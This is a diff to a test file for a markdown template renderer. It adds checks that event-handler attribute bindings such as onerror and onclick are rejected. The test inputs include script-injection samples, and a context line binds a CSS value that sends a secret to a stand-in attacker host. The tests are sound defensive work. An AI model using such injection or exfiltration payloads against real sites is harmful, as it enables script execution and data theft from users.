@@ -424,6 +424,24 @@ Unavailable
       .rejects.toThrow("must resolve to a safe destination")
   })
 
+  it("rejects data bindings for HTML event-handler attributes", async () => {
+    await expect(renderMarkdownTemplate('<img :onerror="data.handler">', {
+      data: { handler: "globalThis.compromised = true" },
+    })).rejects.toMatchObject({ code: "MARKDOWN_TEMPLATE_R0031" })
+    await expect(renderMarkdownTemplate('<div :ONCLICK="data.handler"></div>', {
+      data: { handler: "globalThis.compromised = true" },
+    })).rejects.toMatchObject({ code: "MARKDOWN_TEMPLATE_R0031" })
+    await expect(renderMarkdownTemplate('<div :data-onclick="data.handler"></div>', {
+      data: { handler: "literal" },
+    })).resolves.toContain('data-onclick="literal"')
+    await expect(renderMarkdownTemplate('[link](https://example.com){:onerror="data.handler"}', {
+      data: { handler: "globalThis.compromised = true" },
+    })).rejects.toMatchObject({ code: "MARKDOWN_TEMPLATE_R0031" })
+    await expect(renderMarkdownTemplate('![image](https://example.com/image.png){:onerror="data.handler"}', {
+      data: { handler: "globalThis.compromised = true" },
+    })).rejects.toMatchObject({ code: "MARKDOWN_TEMPLATE_R0031" })
+  })
+
   it("rejects bound CSS values while preserving authored styles", async () => {
     await expect(renderMarkdownTemplate('<div :style="data.css">Content</div>', {
       data: { css: "background:url(https://attacker.test/collect?secret=1)" },
@@ -433,6 +451,7 @@ Unavailable
     await expect(renderMarkdownTemplate('[Open](){:href="data.url" :style="data.css"}', {
       data: { url: "https://example.com", css: "color: red" },
     })).rejects.toThrow("cannot target a style attribute")
+
   })
 
   it("preserves URL-like attributes on custom tags", async () => {
